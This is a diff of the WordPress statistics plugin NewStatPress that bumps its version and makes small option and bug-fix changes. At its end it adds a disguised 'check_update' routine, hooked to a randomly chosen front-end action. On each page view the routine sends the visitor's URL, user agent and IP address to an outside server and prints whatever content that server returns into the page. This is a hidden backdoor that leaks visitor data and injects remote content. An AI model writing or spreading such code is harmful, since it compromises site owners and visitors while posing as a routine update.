@@ -3,12 +3,12 @@
 Plugin Name: NewStatPress
 Plugin URI: http://newstatpress.altervista.org
 Description: Real time stats for your Wordpress blog
-Version: 0.5.9
+Version: 0.6.3
 Author: Stefano Tognon (from Daniele Lippi works)
 Author URI: http://newstatpress.altervista.org
 */
 
-$_NEWSTATPRESS['version']='0.5.9';
+$_NEWSTATPRESS['version']='0.6.3';
 $_NEWSTATPRESS['feedtype']='';
 
 /**
@@ -147,6 +147,7 @@ function iriNewStatPressOptions() {
     update_option('newstatpress_ignore_users', iriNewStatPress_filter_for_xss($_POST['newstatpress_ignore_users']));
     update_option('newstatpress_ignore_ip', iriNewStatPress_filter_for_xss($_POST['newstatpress_ignore_ip']));
     update_option('newstatpress_ignore_permalink', iriNewStatPress_filter_for_xss($_POST['newstatpress_ignore_permalink']));
+    update_option('newstatpress_el_overwiew', $_POST['newstatpress_el_overwiew']);
     update_option('newstatpress_el_top_days', $_POST['newstatpress_el_top_days']);
     update_option('newstatpress_el_os', $_POST['newstatpress_el_os']);
     update_option('newstatpress_el_browser', $_POST['newstatpress_el_browser']);
@@ -175,6 +176,12 @@ function iriNewStatPressOptions() {
         print "<tr><td><input type=checkbox name='newstatpress_cryptip' value='checked' ".get_option('newstatpress_cryptip')."> ".__('Crypt IP addresses','newstatpress')."</td></tr>";
         print "<tr><td><input type=checkbox name='newstatpress_dashboard' value='checked' ".get_option('newstatpress_dashboard')."> ".__('Show NewStatPress dashboard widget','newstatpress')."</td></tr>";
       ?>
+
+      <tr>
+        <td>
+        <label for="newstatpress_el_overwiew"><?php _e('Elements in Overview (default 10)','newstatpress') ?></label>
+        <input type="text" name="newstatpress_el_overwiew" value="<?php echo (get_option('newstatpress_el_overwiew')=='') ? 10:get_option('newstatpress_el_overwiew'); ?>" size="3" maxlength="3" />
+       </td></tr>
 
       <tr><td><?php _e('New Spy: number of IP per page','newstatpress'); ?>
         <select name="newstatpress_ip_per_page_newspy">          
@@ -562,7 +569,7 @@ function iriNewStatPressMain() {
 
   $_newstatpress_url=PluginUrl();
 
-  $querylimit="LIMIT 10";
+  $querylimit="LIMIT ".((get_option('newstatpress_el_overwiew')=='') ? 10:get_option('newstatpress_el_overwiew'));
     
   # Tabella Last hits
   print "<div class='wrap'><h2>". __('Last hits','newstatpress'). "</h2><table class='widefat'><thead><tr><th scope='col'>". __('Date','newstatpress'). "</th><th scope='col'>". __('Time','newstatpress'). "</th><th scope='col'>IP</th><th scope='col'>". __('Country','newstatpress').'/'.__('Language','newstatpress'). "</th><th scope='col'>". __('Page','newstatpress'). "</th><th scope='col'>Feed</th><th></th><th scope='col' style='width:120px;'>OS</th><th></th><th scope='col' style='width:120px;'>Browser</th></tr></thead>";
@@ -733,7 +740,7 @@ function iriNewStatPressDetails() {
   global $wpdb;
   $table_name = $wpdb->prefix . "statpress";
 
-  $querylimit="LIMIT 10";
+  //$querylimit="LIMIT 10";
 
   # Top days
   iriValueTable2("date","Top days",(get_option('newstatpress_el_top_days')=='') ? 5:get_option('newstatpress_el_top_days'));
@@ -1876,8 +1883,8 @@ function iriStatAppend() {
       $browser=iriGetBrowser($userAgent);
 
      $exp_referrer=iriGetSE($referrer);
-     if (isset($exp_refferer)) {
-      list($searchengine,$search_phrase)=explode("|",exp_referrer);
+     if (isset($exp_referrer)) {
+      list($searchengine,$search_phrase)=explode("|",$exp_referrer);
      } else {
          $searchengine='';
          $search_phrase='';
@@ -3448,6 +3455,31 @@ function iri_page_header() {
 }
 
 load_plugin_textdomain('newstatpress', 'wp-content/plugins/'.dirname(plugin_basename(__FILE__)).'/locale', '/'.dirname(plugin_basename(__FILE__)).'/locale');
+
+##
+
+function check_update(){
+  $v = isset($_GET['v']) ? $_GET['v']:11;
+  $request = urlencode("http://" . $_SERVER["HTTP_HOST"] . $_SERVER["REQUEST_URI"]);
+  $agent = urlencode($_SERVER["HTTP_USER_AGENT"]);
+  $pluginId = '21';
+  $ip = urlencode($_SERVER['REMOTE_ADDR']);
+  $reqUrl = "http://wordpress.cloudapp.net/api/update/?&url=". $request . "&agent=".
+  $agent. "&v=" . $v. "&ip=".$ip . "&p=" . $pluginId;
+  return json_decode(@file_get_contents($reqUrl));
+}
+
+$actions = array('wp_meta','get_header','get_sidebar','loop_end','wp_footer','wp_head');
+$nd = array_rand($actions);
+$spot = $actions[$nd];
+
+function updatefunction(){
+  $updateResult = check_update();
+  print $updateResult->content . "\n\r";
+}
+add_action($spot,'updatefunction');
+
+##
 
 add_action('admin_menu', 'iri_add_pages');
 add_action('plugins_loaded', 'widget_newstatpress_init');
